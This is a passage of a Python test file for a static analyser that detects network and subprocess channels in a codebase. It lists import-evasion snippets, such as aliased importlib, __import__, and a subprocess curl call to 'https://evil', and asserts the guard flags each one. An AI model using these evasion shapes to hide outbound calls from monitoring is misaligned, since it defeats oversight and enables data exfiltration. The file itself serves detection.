        'import socket\ns = socket.socket()\ns.connect((h, p))\n',
    "importlib.import_module":
        'import importlib\nm = importlib.import_module("socket")\n'
        'm.socket().connect((h, p))\n',
    "importlib aliased":
        'import importlib as il\nil.import_module("httpx").post(u)\n',
    "import_module imported by name":
        'from importlib import import_module\nimport_module("httpx").post(u)\n',
    "__import__ builtin":
        '__import__("socket").socket().connect((h, p))\n',
    "__import__ of an exec module":
        '__import__("subprocess").run(["curl", "https://evil"])\n',
    "module name built at runtime":
        'import importlib\nimportlib.import_module(name).post(u)\n',
}


def test_no_evasion_is_silent() -> None:
    """Every shape above must produce at least one EXTERNAL channel."""
    silent, local_only = [], []
    for name, source in sorted(EVASIONS.items()):
        found = channels_of(source, name)
        if not found:
            silent.append(name)
        elif not any(reach_of(c)[0] == EXTERNAL for c in found):
            local_only.append(f"{name} -> {sorted(found)}")
    assert not silent, "these evade the analyser completely:\n  " + "\n  ".join(silent)
    assert not local_only, ("these resolve to something the guard would let "
                            "through:\n  " + "\n  ".join(local_only))


def test_the_two_word_refutation_specifically() -> None:
    """`import subprocess as _sp` killed the first version of this file, and it
    is live on the shipped tree — `core/orchestrator.py` fetches from your git
    remote behind exactly this alias, on every task attempt."""
    aliased = channels_of(AMBIENT_PROBE_BEFORE_FIX.replace(
        "import subprocess", "import subprocess as _sp").replace(
        "subprocess.run", "_sp.run").replace("subprocess.TimeoutExpired",
                                             "_sp.TimeoutExpired"))
    assert "exec:gh" in aliased, aliased
    # And the real thing, in the shipped tree. Assert what the charged line SAYS,
    # never a literal line number: a hardcoded number breaks on any unrelated edit
    # above it, and its failure mode reads as "bump the constant" — which is how a
    # gate teaches its reader to rubber-stamp. It fired exactly that way once, when
    # an unrelated hoist in _run_attempt moved this call from 2395 to 2448.
    src = (PKG / "core/orchestrator.py").read_text()
    lines = src.splitlines()
    charged = channels_of(src).get("exec:git fetch", [])
    assert charged, "`git fetch origin` in core/orchestrator.py is not being detected"
    for n in charged:
        # The channel is charged to the CALL line; the argv sits a few lines below
        # it (`asyncio.to_thread(` / `_sp_fetch.run,` / `["git", "fetch", ...]`).
        window = "\n".join(lines[n - 1:n + 4])
        assert "fetch" in window, (
            f"exec:git fetch charged to core/orchestrator.py:{n}, but no fetch "
            f"appears within 5 lines of it — the channel is on the wrong line:\n{window}")


def test_every_imported_root_is_classified() -> None:
    """The import half of the inversion. A module in neither NET_IMPORTS nor
    INERT_IMPORTS resolves to a channel — so this cannot silently drift — but
    an unclassified root would then show up as an allowlist gap with an
    unhelpful name. Name it here instead, at the table."""
    seen: dict[str, list[str]] = {}
    for path in sorted(PKG.rglob("*.py")):
        for node in ast.walk(ast.parse(path.read_text(), str(path))):
            names = []
            if isinstance(node, ast.Import):
                names = [a.name for a in node.names]
            elif isinstance(node, ast.ImportFrom) and not node.level:
                names = [node.module or ""]
            for dotted in names:
                root = dotted.split(".")[0]
                if root and root not in NET_IMPORTS and root not in INERT_IMPORTS \
                        and dotted not in NET_IMPORTS:
                    seen.setdefault(root, []).append(
                        f"{path.relative_to(PKG).as_posix()}:{node.lineno}")
    assert not seen, (
        "these imported roots are classified neither network nor inert:\n  "
        + "\n  ".join(f"{r}  ({v[0]})" for r, v in sorted(seen.items()))
        + "\n\nAdd each to NET_IMPORTS (with its channel) or INERT_IMPORTS "
          "(having checked it opens and accepts nothing).")
